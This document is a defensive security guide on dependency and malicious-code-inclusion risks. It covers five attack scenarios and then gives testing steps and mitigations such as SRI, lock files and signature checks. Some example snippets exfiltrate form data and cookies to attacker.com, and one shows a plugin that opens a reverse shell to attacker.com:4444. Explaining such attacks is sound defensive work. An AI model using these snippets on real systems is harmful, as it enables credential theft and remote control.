# Dependencies and Malicious Code Inclusion

Dependencies and malicious code inclusion describe risks where applications load external code without trust or verification. A single compromised library, plugin, or external script runs with full application privileges and turns trusted execution into attacker-controlled behavior.

These attacks scale fast through supply chains. One poisoned dependency spreads data theft, command execution, or persistence across many systems, often before detection during development or deployment.

***

### Real-World Attack Scenarios

#### Scenario 1: NPM Package Dependency Vulnerability

JavaScript application uses NPM package with vulnerability:

```json
{
  "dependencies": {
    "lodash": "4.17.15",
    "express": "4.17.1",
    "axios": "0.19.0"
  }
}
```

**The attack:**

1. Attacker discovers vulnerability in `axios` 0.19.0
2. Creates exploit that steals API keys from environment
3. Publishes as update to same version or patches version
4. When `npm install` runs, malicious version downloaded

```bash
# Developer installs dependencies
npm install

# Malicious axios code executes during installation
# Steals environment variables with API keys
process.env.API_KEYS → sent to attacker
process.env.DATABASE_URL → sent to attacker
process.env.AWS_CREDENTIALS → sent to attacker
```

**Result:**

* Credentials stolen during installation
* Attacker gains cloud access
* Database compromise
* Complete infrastructure takeover

**Finding it:** Check dependency versions. Look for suspicious install scripts. Monitor outbound network requests during npm install.

***

#### Scenario 2: CDN Link Without Integrity Check

Web application loads JavaScript from CDN without verification:

```html
<!-- No integrity check! -->
<script src="https://cdn.example.com/jquery.js"></script>

<!-- Or loading from external domain -->
<script src="https://attacker-controlled.com/analytics.js"></script>
```

**The attack:**

1. Attacker compromises CDN or redirects traffic
2. Serves malicious JavaScript instead
3. JavaScript steals session tokens, credentials, form data

```javascript
// Malicious JavaScript injected via CDN
document.addEventListener('submit', function(e) {
    var form = e.target;
    var data = new FormData(form);
    
    // Exfiltrate form data to attacker
    fetch('https://attacker.com/steal', {
        method: 'POST',
        body: data
    });
});

// Steal cookies
fetch('https://attacker.com/steal-cookies?cookies=' + document.cookie);
```

When user submits form → credentials sent to attacker.

**Result:**

* Session token theft
* Credential capture
* Form data exfiltration
* Account takeover

**Finding it:** Check for SRI (Subresource Integrity) hashes. Look for external script sources. Verify HTTPS for all resources.

***

#### Scenario 3: Plugin/Extension Vulnerability

Application loads third-party plugins without verification:

```python
# Load plugins from directory
import importlib
import os

plugins_dir = '/opt/plugins'

for plugin_file in os.listdir(plugins_dir):
    if plugin_file.endswith('.py'):
        # Load and execute plugin WITHOUT verification
        plugin = importlib.import_module(plugin_file[:-3])
        plugin.initialize()
```

**The attack:**

1. Attacker places malicious plugin in plugins directory
2. Application loads and executes it
3. Malicious plugin has full application access

```python
# Malicious plugin
def initialize():
    import socket
    
    # Connect back to attacker
    s = socket.socket()
    s.connect(('attacker.com', 4444))
    
    # Execute commands from attacker
    while True:
        cmd = s.recv(1024).decode()
        output = os.popen(cmd).read()
        s.send(output.encode())
```

**Result:**

* Remote code execution
* Full application compromise
* Attacker command execution

**Finding it:** Check plugin loading mechanisms. Look for plugins without signature verification. Test loading malicious plugins.

***

#### Scenario 4: Package Manager Supply Chain Attack

Attacker registers similar package name to popular library (typosquatting):

```
Real package: "lodash"
Attacker creates: "lodash-utils" or "loadash"

Developer typos in package.json:
"dependencies": {
  "loadash": "^4.17.0"  // Wrong spelling!
}

Installs malicious package instead of legitimate one
```

**The attack:**

```bash
# Developer installs wrong package
npm install loadash

# Malicious package executes install script
# In package.json:
{
  "scripts": {
    "preinstall": "node steal-keys.js"
  }
}

# Installation hook steals credentials
# Sends to attacker server
```

**Result:**

* Credentials stolen during development
* Developer machine compromised
* All projects affected

**Finding it:** Verify package names carefully. Use lock files (package-lock.json). Monitor packages for suspicious behavior.

***

#### Scenario 5: Unverified Code Download

Application downloads executable code at runtime without integrity check:

```python
import urllib.request
import subprocess

# Download code from internet
url = "https://example.com/update.exe"
urllib.request.urlretrieve(url, "update.exe")

# Execute without verification
subprocess.run(["update.exe"])
```

**The attack:**

1. Attacker intercepts download (MITM attack)
2. Replaces legitimate code with malware
3. Malware executes with application privileges

Or attacker compromises download server:

```bash
# Legitimate: update.exe (5MB)
# Attacker replaces with: malware.exe (2MB)
# Application downloads and executes
```

**Result:**

* Malware execution
* System compromise
* Credential theft
* Persistence

**Finding it:** Check for downloads without HTTPS. Look for missing integrity checks. Test with MITM proxy.

***

### How to Identify Untrusted Code Loading During Testing

**1. Audit dependencies**

```bash
# Check all dependencies
npm audit
pip show --all
composer show

# Look for known vulnerabilities
```

**2. Test for missing integrity checks**

```bash
# Try MITM attack on JavaScript loads
# Use Burp Suite to replace script content
# Check if application still executes malicious code
```

**3. Monitor network requests**

Watch for:

* Unencrypted downloads (HTTP instead of HTTPS)
* Missing SRI hashes on script tags
* External script sources
* Unexpected outbound connections

**4. Check for signature verification**

```bash
# Look for signature validation code
grep -r "verify.*signature\|check.*integrity" .

# If not found, no verification happening
```

**5. Test plugin/extension loading**

Try loading malicious plugins. Check if executed without validation.

***

### Mitigation Strategies

**Use SRI (Subresource Integrity) for external scripts**

```html
<!-- With SRI hash -->
<script 
  src="https://cdn.example.com/jquery.js"
  integrity="sha384-abc123...=="
  crossorigin="anonymous">
</script>

<!-- Without SRI (VULNERABLE) -->
<script src="https://cdn.example.com/jquery.js"></script>
```

**Pin dependency versions**

```json
{
  "dependencies": {
    "lodash": "4.17.21",  // Exact version, not "^4.17"
    "express": "4.18.2"   // Pinned versions safer
  }
}
```

**Use lock files**

```bash
# Generate lock file
npm install
# Commit package-lock.json to git

# Later installs use exact versions from lock
npm ci  # Install from lock file, not package.json
```

**Verify package integrity**

```bash
# Use checksums
npm install --save-exact package-name

# Verify against known good checksums
npm view package-name dist
```

**Don't execute install scripts**

```bash
# Skip scripts during installation
npm install --ignore-scripts

# Manually review and run if needed
npm run postinstall
```

**Use allowlist for external resources**

```python
ALLOWED_HOSTS = [
  'https://cdn.cloudflare.com',
  'https://cdn.jsdelivr.net',
]

def load_script(url):
    for allowed in ALLOWED_HOSTS:
        if url.startswith(allowed):
            return download(url)
    raise ValueError("Untrusted script source")
```

**Verify code signatures**

```python
import hashlib
import hmac

def verify_code_signature(code, signature, secret_key):
    expected = hmac.new(
        secret_key.encode(),
        code.encode(),
        hashlib.sha256
    ).hexdigest()
    
    if not hmac.compare_digest(signature, expected):
        raise ValueError("Code signature verification failed")
    
    return True
```

**Monitor for suspicious behavior**

* Unexpected network requests
* Spawning child processes
* File system modifications
* Environment variable access
* Credential theft attempts

***

{% embed url="<https://cwe.mitre.org/data/definitions/494.html>" %}

{% embed url="<https://cwe.mitre.org/data/definitions/509.html>" %}

{% embed url="<https://cwe.mitre.org/data/definitions/829.html>" %}

{% embed url="<https://cwe.mitre.org/data/definitions/830.html>" %}

{% embed url="<https://owasp.org/www-project-dependency-check/>" %}

{% embed url="<https://docs.npmjs.com/cli/v8/commands/npm-audit>" %}

{% embed url="<https://www.srihash.org/>" %}

{% embed url="<https://cwe.mitre.org/data/definitions/494.html>" %}
